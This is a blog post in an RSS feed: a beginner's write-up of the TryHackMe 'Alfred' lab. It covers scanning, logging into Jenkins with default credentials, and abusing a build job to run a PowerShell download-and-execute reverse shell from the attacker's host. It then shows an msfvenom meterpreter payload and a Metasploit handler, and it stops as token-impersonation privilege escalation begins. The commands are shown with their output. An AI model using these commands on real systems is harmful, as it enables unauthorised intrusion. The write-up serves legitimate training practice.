<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on tzero86.bits</title>
        <link>https://tzero86-bits.netlify.app/posts/</link>
        <description>Recent content in Posts on tzero86.bits</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Sun, 16 Aug 2020 14:00:11 -0400</lastBuildDate>
        <atom:link href="https://tzero86-bits.netlify.app/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Alfred_writeup.sh</title>
            <link>https://tzero86-bits.netlify.app/posts/alfred_writeup/</link>
            <pubDate>Sun, 16 Aug 2020 14:00:11 -0400</pubDate>
            
            <guid>https://tzero86-bits.netlify.app/posts/alfred_writeup/</guid>
            <description>Alfred - TryHackme&amp;rsquo;s Room Writeup This my first attempt at creating a writup, I tried putting every single step I took to solve this room. While providing enough (I think) details and descriptions so it is useful for noobs like me mostly. I started drafting this at the same time I managed to solve a question or even right after thinking a way to approach a solution for any of those.</description>
            <content type="html"><![CDATA[<h2 id="alfred---tryhackmes-room-writeup">Alfred - TryHackme&rsquo;s Room Writeup</h2>
<p>This my first attempt at creating a writup, I tried putting every single step I took to solve this room. While providing enough (I think) details and descriptions so it is useful for noobs like me mostly. I started drafting this at the same time I managed to solve a question or even right after thinking a way to approach a solution for any of those. I even left some futile attemps of enumeration to be honest about my process of solving this. I hope somebody finds this useful somehow, it ceirtanly helped me to practice some tools and approaches. As I&rsquo;m still quite new to this, you can expect some errors in this post or maybe spot some things that an experienced person could probably solve better. I&rsquo;m learning, beware of the blog.</p>
<h2 id="task-1---getting-initial-access">[Task 1] - Getting Initial Access</h2>
<p>For this room it seems we&rsquo;ll need <strong>Nishang</strong> in order to gain access to the machine by using <strong><em>reverse shell scripts</em></strong>.</p>
<p>So lets start by listing the links to get this <strong>Nishang</strong> tool:</p>
<ul>
<li><strong>Nishang</strong>: <a href="https://github.com/samratashok/nishang">Click here</a> to access the repository and get this Powershell toolset.</li>
<li><strong>Alfred Room on THM</strong>: <a href="https://tryhackme.com/room/alfred">Click here</a> to visit this room on TryHackme platform.</li>
</ul>
<p>Ok once you have that tool downloaded to your system we can get started. Let&rsquo;s go question by question as designed for this THM box.</p>
<blockquote>
<p>Question #1: How many ports are open?</p>
</blockquote>
<p>Ok so for this question we&rsquo;ll run <strong>Nmap</strong> to enumerate any open ports. It is importan to note that the room description mentions this machine <strong>won&rsquo;t respond to ping (ICMP)</strong> requests. So we&rsquo;ll need to add switch to deal with that when running our scan.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sudo nmap -A -Pn -p- 10.10.177.5

</code></pre></div><p>We&rsquo;ll use the switch/flag <strong>-Pn</strong> to avoid <strong>Nmap</strong> doing a ping before starting the scans. Also we use <strong>-p-</strong> to scan for all the ports  instead of the most common ones.</p>
<p>Once we get our results back we&rsquo;ll now the response for the first question. <em>Scanning all ports might take a while.</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-08-16 14:19 EDT
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.177.5
Host is up <span style="color:#f92672">(</span>0.39s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">65532</span> filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Site doesn<span style="color:#e6db74">&#39;t have a title (text/html).
</span><span style="color:#e6db74">3389/tcp open  ssl/ms-wbt-server?
</span><span style="color:#e6db74">8080/tcp open  http               Jetty 9.4.z-SNAPSHOT
</span><span style="color:#e6db74">| http-robots.txt: 1 disallowed entry 
</span><span style="color:#e6db74">|_/
</span><span style="color:#e6db74">|_http-server-header: Jetty(9.4.z-SNAPSHOT)
</span><span style="color:#e6db74">|_http-title: Site doesn&#39;</span>t have a title <span style="color:#f92672">(</span>text/html;charset<span style="color:#f92672">=</span>utf-8<span style="color:#f92672">)</span>.
Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
Aggressive OS guesses: Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 SP1 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 or Windows <span style="color:#ae81ff">8</span> <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">7</span> SP1 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows 8.1 Update <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows Phone 7.5 or 8.0 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">7</span> or Windows Server <span style="color:#ae81ff">2008</span> R2 <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> or <span style="color:#ae81ff">2008</span> Beta <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 or Windows 8.1 <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>
No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
Network Distance: <span style="color:#ae81ff">4</span> hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE <span style="color:#f92672">(</span>using port 8080/tcp<span style="color:#f92672">)</span>
HOP RTT       ADDRESS
<span style="color:#ae81ff">1</span>   247.10 ms 10.13.0.1
<span style="color:#ae81ff">2</span>   ... <span style="color:#ae81ff">3</span>
<span style="color:#ae81ff">4</span>   385.31 ms 10.10.177.5

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 558.59 seconds

</code></pre></div><p>Ok, so based on these results we now know how many ports are open.</p>
<blockquote>
<p>Question #2: What is the username and password for the log in panel(in the format username:password)?</p>
</blockquote>
<p>Ok let&rsquo;s start by seeing what is being served in the port <strong>80</strong> of this machine.</p>
<p><img src="https://i.imgur.com/FK0zWJh.png" alt="enter image description here">
Ok so we get an email <em><strong>ï»¿alfred@wayneenterprises.com</strong></em>, and a picture. Let&rsquo;s see if we get any other useful information by inspecting the <strong>DOM</strong>.</p>
<p>It seems there is not much info lying around the code of the page. It is always worth checking anyway.</p>
<p>The next thing we can check, is to review if we may have any data encrypted into that image of Bruce Wayne.  So let&rsquo;s download it.</p>
<p>At this point we would need a **passphrase ** if we want to attempt to extract any possibly hidden data in from this image. Since we don&rsquo;t have any piece of info so far that could act as a passphrase. We&rsquo;ll move forward from this for now. Also we are not even sure if this image has had any <strong>steganography</strong> job done.</p>
<p>I would be wise to start scanning for some other directories we might be able to access. Let&rsquo;s use GoBuster.</p>
<p>let&rsquo;s start a GoBuster scan with a small list first and see how it goes.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://10.10.177.5/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
</code></pre></div><p>This might also take some time to run, but once it finishes we should have a better idea if there are any common directories that we can access.</p>
<p>This is what the GoBuster scan in progress looks like:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">===============================================================</span>
Gobuster v3.0.1
by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@_FireFart_<span style="color:#f92672">)</span>
<span style="color:#f92672">===============================================================</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:            http://10.10.177.5/
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:        <span style="color:#ae81ff">10</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Status codes:   200,204,301,302,307,401,403
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:     gobuster/3.0.1
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:        10s
<span style="color:#f92672">===============================================================</span>
2020/08/16 14:45:12 Starting gobuster
<span style="color:#f92672">===============================================================</span>
Progress: <span style="color:#ae81ff">11841</span> / <span style="color:#ae81ff">87665</span> <span style="color:#f92672">(</span>13.51%<span style="color:#f92672">)</span>

</code></pre></div><p>While we wait for GoBuster to try to find any directories. Let&rsquo;s take a look at what we have at port <strong>8080</strong>.</p>
<p><img src="https://i.imgur.com/oLuheqV.png" alt="port 8080 login page">
Ok so we get a login form, we might as well try out some basic user:password combinations to see if maybe the security has overlooked something that basic.</p>
<p>We can go with the basic <strong>admin:1234</strong>, <strong>admin:password</strong>, <strong>admin:admin</strong>, etc.</p>
<p>Look at that, using <strong>admin:admin</strong> to log in has granted us access to Jenkins.</p>
<p>If a super weak password was not available, I&rsquo;d probably try to force my way through this login form using <strong>Burp&rsquo;s Intruder</strong> or <strong>hydra</strong> with the <strong>rockyou.txt</strong> wordlist.</p>
<p><img src="https://i.imgur.com/kzHXdI4.png" alt="Jenkins admin panel">
So that gives us the answer to Question #2.</p>
<p>Let&rsquo;s move to the next objective.</p>
<blockquote>
<p>Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: <strong><em>powershell iex (New-Object Net.WebClient).DownloadString(&lsquo;http://your-ip:your-port/Invoke-PowerShellTcp.ps1&rsquo;);Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port</em></strong></p>
</blockquote>
<p>Well this objective kind of gives us quite a hit at what to do next. I figure we need to find a way to execute that on our newly accessed server. Let&rsquo;s take a look at what can we do in our Jenkins admin panel.</p>
<p>If we take a look at the existing jobs in the server, we see this job called <strong>project</strong> which was last run months ago, but it also ran successfully.</p>
<p><img src="https://i.imgur.com/cilmo5K.png" alt="Running Job on the server">
Let&rsquo;s click on the job name to see what else we got here.</p>
<p><img src="https://i.imgur.com/9IRIUNm.png" alt="Job details page">
If we click the <strong>configure</strong> button on this dashboard. We get the specific details of what this job does. Let&rsquo;s scroll down to the <strong>Build</strong> to see some more info.</p>
<p><img src="https://i.imgur.com/T86ylyd.png" alt="Job build command">
So this job only runs a <strong>whoami</strong> command. I figure we can just use this section to place our exploitation command as suggested by the room&rsquo;s hint.</p>
<p>Ok, so the idea is this, we&rsquo;ll locally create a <strong>Python3 HTTP Server</strong> to serve the PowerShell script we get from <strong>Nishang</strong>  and we add the command to retrieve that script from our local sever into the Jenkin&rsquo;s Job build command.</p>
<p>Ok so looking at <strong>Nishang&rsquo;s</strong> folder we see that we have all scripts categorized. We&rsquo;ll be attempting to get a reverse shell, so let&rsquo;s look inside <strong>/nishang/Shells/</strong></p>
<p>From the room&rsquo;s hint we already know we are looking for, <strong>Invoke-PowerShellTcp.ps1</strong></p>
<p>So let&rsquo;s get this file shared in our local HTTP server.
We navigate to the <strong>Shells</strong> folder and fire up our server like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo python3 -m http.server
</code></pre></div><p>We should see something like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...
</code></pre></div><p>So our server is ready. Let&rsquo;s get that command set on the Jenkins job next.</p>
<p>Ok, let&rsquo;s review the command. We need to make some adjustments before we paste it into Jenkins.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell iex (New-Object Net.WebClient).DownloadString(<span style="color:#e6db74">&#39;http://your-ip:your-port/Invoke-PowerShellTcp.ps1&#39;</span>);Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
</code></pre></div><p>We need to change the <strong>IP and Port</strong>  and also make sure we specify a port value for our reverse shell. So this full command would attempt to connect to our local server to get the PS script and then open a reverse shell on a specific port to connect to our local listener(we&rsquo;ll do that in a bit).</p>
<blockquote>
<p><strong>Remember to get your correct IP when connected to THMs VPN. It is usually tun0. Run <em>ip add</em> command to see your IP.</strong></p>
</blockquote>
<p>In my case the command will look like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell iex (New-Object Net.WebClient).DownloadString(<span style="color:#e6db74">&#39;http://10.13.0.34:8000/Invoke-PowerShellTcp.ps1&#39;</span>);Invoke-PowerShellTcp -Reverse -IPAddress 10.13.0.34 -Port 6666
</code></pre></div><p>We have the command ready, we are just missing one tiny crucial part. We need to open a local listener on port 666 so our exploit can successfully open a reverse shell. Let&rsquo;s do that.</p>
<p>In a terminal window start a <strong>netcat</strong> listener on port <strong>6666</strong>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nc -lvp <span style="color:#ae81ff">6666</span>
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">6666</span> ...
</code></pre></div><p>That&rsquo;s done, now to paste our full command into the Jenkins Job Build command section.</p>
<p><img src="https://i.imgur.com/aWPWDUy.png" alt="We enter our exploit command">
After we enter the command, we click on <strong>Save</strong> button to save the changes.</p>
<p>Then we go back to the main project details page.
Let&rsquo;s trigger a new build by clicking on <strong>Build Now</strong> button so we see if your command runs fine.</p>
<p><img src="https://i.imgur.com/2RYq1y7.png" alt="Build Now button"></p>
<p>We see a new build has been queued:</p>
<p><img src="https://i.imgur.com/blngU7y.png" alt="our basic HTTP server works">
We see that our local server has received a request to serve a file, this seems to be working fine so far:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...
10.10.177.5 - - <span style="color:#f92672">[</span>16/Aug/2020 16:58:25<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /Invoke-PowerShellTcp.ps1 HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
</code></pre></div><p>Let&rsquo;s see if something happened in our listener:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">6666</span> ...
10.10.177.5: inverse host lookup failed: Unknown host
connect to <span style="color:#f92672">[</span>10.13.0.34<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.177.5<span style="color:#f92672">]</span> <span style="color:#ae81ff">49204</span>
Windows PowerShell running as user bruce on ALFRED
Copyright <span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> <span style="color:#ae81ff">2015</span> Microsoft Corporation. All rights reserved.

PS C:<span style="color:#ae81ff">\P</span>rogram Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span><span style="color:#ae81ff">\J</span>enkins<span style="color:#ae81ff">\w</span>orkspace<span style="color:#ae81ff">\p</span>roject&gt;

</code></pre></div><p>We got a reverse shell successfully!</p>
<p>so let&rsquo;s explore the machine a bit. If we type <strong>dir c:/</strong> we&rsquo;ll navigate to the root folder. From here we can go up into the Users folder to see what we got. We see a <strong>bruce</strong> user there. We can review each folder but for the sake of not making this write-up eternal Let&rsquo;s see what&rsquo;s inside the <strong>bruce/Desktop/</strong> folder.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
Directory: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\b</span>ruce<span style="color:#ae81ff">\D</span>esktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---        10/25/2019   3:22 PM         <span style="color:#ae81ff">32</span> user.txt                          


PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\b</span>ruce<span style="color:#ae81ff">\D</span>esktop&gt; type user.txt
<span style="color:#f92672">{</span>and-we-finally-get-the-flag-value<span style="color:#f92672">}</span>

</code></pre></div><p>Well, we made it this far. We were able to exploit a Jenkins project/job and we managed to get a reverse shell successfully. With this we can mark Question #3 as completed and we can  also answer the question number 4.</p>
<blockquote>
<p>As it turns out we didn&rsquo;t need any <strong>GoBuster</strong> scans. They returned nothing useful anyways. However, we still we managed to get the initial access and it never hurts to do some extra enumeration.</p>
</blockquote>
<h2 id="task-2---switching-shells">[Task 2] - Switching shells</h2>
<p>In this section we&rsquo;ll see how to leverage <strong>meterpreter</strong> to aid our privilege escalation attempts.</p>
<p>In this section there is not much to add, as the room really provides almost all you need to answer the only question asked:</p>
<blockquote>
<p>Question: What is the final size of the exe payload that you generated?</p>
</blockquote>
<p>Ok so we&rsquo;ll be using <strong>msfvenom</strong> to generate a payload.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST<span style="color:#f92672">=[</span>IP<span style="color:#f92672">]</span> LPORT<span style="color:#f92672">=[</span>PORT<span style="color:#f92672">]</span> -f exe -o <span style="color:#f92672">[</span>SHELL NAME<span style="color:#f92672">]</span>.exe
</code></pre></div><p>We need to replace <strong>[IP], [PORT] and [SHELL NAME]</strong></p>
<p>For the sake of simplicity we&rsquo;ll bake this payload on the same <strong>Shells</strong> folder where we started our local server already.</p>
<p>In my case the final <strong>msfvenom</strong> command looks like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST<span style="color:#f92672">=</span>10.13.0.34 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">6555</span> -f exe -o payload.exe
</code></pre></div><p>After running that command we get the following back:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST<span style="color:#f92672">=</span>10.13.0.34 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">6555</span> -f exe -o payload.exe
<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found <span style="color:#ae81ff">1</span> compatible encoders
Attempting to encode payload with <span style="color:#ae81ff">1</span> iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size <span style="color:#ae81ff">368</span> <span style="color:#f92672">(</span>iteration<span style="color:#f92672">=</span>0<span style="color:#f92672">)</span>
x86/shikata_ga_nai chosen with final size <span style="color:#ae81ff">368</span>
Payload size: <span style="color:#ae81ff">368</span> bytes
Final size of exe file: <span style="color:#f92672">{</span>ANSWER<span style="color:#f92672">}</span> bytes
Saved as: payload.exe
</code></pre></div><p>The rest of the plan follows the same approach we already did for  [Part 1]. We&rsquo;ll create a new PowerShell command to be added to the Jenkins job but this time we don&rsquo;t need the PS script as we&rsquo;ll be using the <strong>payload.exe</strong> that we just generated so the command varies a bit.</p>
<p>In my case that command would look like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell <span style="color:#e6db74">&#34;(New-Object System.Net.WebClient).Downloadfile(&#39;http://10.13.0.34:8000/payload.exe&#39;,&#39;payload.exe&#39;)&#34;</span>
</code></pre></div><p>We&rsquo;ll also need to setup a <strong>multi handler</strong> in <strong>metasploit</strong> to listen for our <strong>payload.exe</strong> reverse shell connection.</p>
<p>In our terminal let&rsquo;s start <strong>msfconsole</strong> to fire up <strong>metasploit</strong> and create our listener.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ msfconsole
                                                  
<span style="color:#75715e"># cowsay++</span>
 ____________
&lt; metasploit &gt;
 ------------
       <span style="color:#ae81ff">\ </span>  ,__,
        <span style="color:#ae81ff">\ </span> <span style="color:#f92672">(</span>oo<span style="color:#f92672">)</span>____
           <span style="color:#f92672">(</span>__<span style="color:#f92672">)</span>    <span style="color:#f92672">)</span><span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>              <span style="color:#f92672">||</span>--<span style="color:#f92672">||</span> *


       <span style="color:#f92672">=[</span> metasploit v5.0.101-dev                         <span style="color:#f92672">]</span>
+ -- --<span style="color:#f92672">=[</span> <span style="color:#ae81ff">2049</span> exploits - <span style="color:#ae81ff">1108</span> auxiliary - <span style="color:#ae81ff">344</span> post       <span style="color:#f92672">]</span>
+ -- --<span style="color:#f92672">=[</span> <span style="color:#ae81ff">562</span> payloads - <span style="color:#ae81ff">45</span> encoders - <span style="color:#ae81ff">10</span> nops            <span style="color:#f92672">]</span>
+ -- --<span style="color:#f92672">=[</span> <span style="color:#ae81ff">7</span> evasion                                       <span style="color:#f92672">]</span>

Metasploit tip: After running db_nmap, be sure to check out the result of hosts and services

msf5 &gt; 

</code></pre></div><p>Here you can type <strong>search multi handler</strong> to locate the exploit we need and <strong>show payloads</strong> to select the right payload for it. For simplicity these are the right ones to use as instructed by the room itself:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 &gt; use exploit/multi/handler
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using configured payload generic/shell_reverse_tcp
msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; 
</code></pre></div><p>Then we select the right payload:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD <span style="color:#f92672">=</span>&gt; windows/meterpreter/reverse_tcp
msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; 
</code></pre></div><p>Now you can type in <strong>show options</strong> to see which options are required for us to set, in order to run the exploit.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; show options

Module options <span style="color:#f92672">(</span>exploit/multi/handler<span style="color:#f92672">)</span>:

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options <span style="color:#f92672">(</span>windows/meterpreter/reverse_tcp<span style="color:#f92672">)</span>:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique <span style="color:#f92672">(</span>Accepted: <span style="color:#e6db74">&#39;&#39;</span>, seh, thread, process, none<span style="color:#f92672">)</span>
   LHOST                      yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
   LPORT     <span style="color:#ae81ff">4444</span>             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   <span style="color:#ae81ff">0</span>   Wildcard Target

</code></pre></div><p>As we can see, we just need to set <strong>[LHOST]</strong> and <strong>[LPORT]</strong> to the right values, let&rsquo;s do that.  And type in <strong>exploit</strong> or <strong>run</strong> to start our <strong>metasploit listener/handler</strong>.</p>
<blockquote>
<p>Make sure to set the <strong>[LPORT]</strong> to the port you specified when creating the <strong>payload.exe</strong> with <strong>msfvenom</strong>.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set LHOST 10.13.0.34
LHOST <span style="color:#f92672">=</span>&gt; 10.13.0.34
msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set LPORT <span style="color:#ae81ff">6555</span>
LPORT <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">6555</span>
msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; exploit
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.13.0.34:6555 
</code></pre></div><p>Now let&rsquo;s update that Jenkins Job build command with our payload.</p>
<p><img src="https://i.imgur.com/varPI6i.png" alt="we paste our new PS command to load our new payload">
Save the changes and again, trigger a new build as we did before. But unlike the previous deployed build in this case the exploit will just upload our payload to the server and we&rsquo;ll use our existing reverse shell from [Task 1] to execute it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\project&gt;dir


Directory<span style="color:#960050;background-color:#1e0010">:</span> C:\Program Files (x86)\Jenkins\workspace\project


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---         8/16/2020   3<span style="color:#960050;background-color:#1e0010">:</span>17 PM      73802 payload.exe     
</code></pre></div><p>We can see our payload got uploaded correctly. Let&rsquo;s run it now.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\project&gt;Start-Process <span style="color:#e6db74">&#34;payload.exe&#34;</span>   
</code></pre></div><p>Once our payload runs, we see our <strong>meterpreter</strong> session gets created:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; exploit

<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.13.0.34:6555 
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">176195</span> bytes<span style="color:#f92672">)</span> to 10.10.177.5
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>10.13.0.34:6555 -&gt; 10.10.177.5:49213<span style="color:#f92672">)</span> at 2020-08-16 18:32:18 -0400

meterpreter &gt; 

</code></pre></div><p>We successfully switched from a basic shell to a <strong>meterpreter</strong> shell. This concludes [Task 2].</p>
<h2 id="task-3---privilege-escalation">[Task 3] - Privilege Escalation</h2>
<p>To solve this last task we&rsquo;ll have to leverage the <strong>token impersonation</strong> technique. The room itself goes into a bit of detail of what it is and how it works. Let&rsquo;s just skip to how to exploit it before this write-up gets any longer.</p>
<p>We need to use the <strong>whoami /priv</strong> command to see the permissions we have for the user <strong>bruce</strong>. Let&rsquo;s run that command in our reverse shell.</p>
